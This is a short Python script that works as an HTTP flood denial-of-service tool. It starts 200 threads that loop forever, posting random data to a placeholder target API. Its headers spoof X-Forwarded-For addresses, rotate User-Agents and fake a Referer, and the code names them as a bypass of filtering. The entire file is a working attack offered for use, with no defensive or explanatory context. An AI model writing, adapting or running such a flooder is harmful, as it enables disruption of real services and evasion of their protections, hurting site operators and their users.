import requests
import threading
import random
import string
import time

TARGET_URL = "https://target-site.com/api"  # Target API endpoint
THREADS = 200  # Number of attack threads

def random_string(length=12):
    return ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(length))

def bypass_headers():
    return {
        "User-Agent": random.choice([
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)",
            "Mozilla/5.0 (X11; Linux x86_64)"
        ]),
        "X-Forwarded-For": ".".join(str(random.randint(0, 255)) for _ in range(4)),
        "Referer": "https://google.com",
        "Cache-Control": "no-cache"
    }

def attack():
    while True:
        try:
            payload = {"data": random_string(64)}
            requests.post(TARGET_URL, headers=bypass_headers(), data=payload, timeout=3)
        except:
            pass

def main():
    for _ in range(THREADS):
        t = threading.Thread(target=attack)
        t.start()
    while True:
        time.sleep(1)

if __name__ == "__main__":
    main()
